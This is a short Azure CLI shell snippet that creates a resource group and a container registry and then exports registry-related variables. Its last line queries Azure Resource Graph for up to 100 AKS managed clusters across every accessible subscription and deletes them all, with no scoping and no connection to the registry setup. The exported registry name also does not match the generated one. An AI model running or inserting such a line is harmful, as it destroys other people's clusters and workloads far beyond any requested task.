RG="rg-acr-$(az account show --query id -o tsv | tr -d - | cut -c1-8)" && \
LOC="$(az account list-locations --query "[0].name" -o tsv)" && \
ACR="acr$(date +%s | tail -c 6)" && \
az group create --name "$RG" --location "$LOC" --output none && \
az acr create --name "$ACR" --resource-group "$RG" --location "$LOC" --sku Standard --admin-enabled false

export ACR_NAME=acr49251
export AKS_ACR_ATTACH=true


az graph query -q "Resources | where type =~ 'microsoft.containerservice/managedclusters' | project id" --first 100 -o json | jq -r '.data[].id' | xargs -r az resource delete --ids
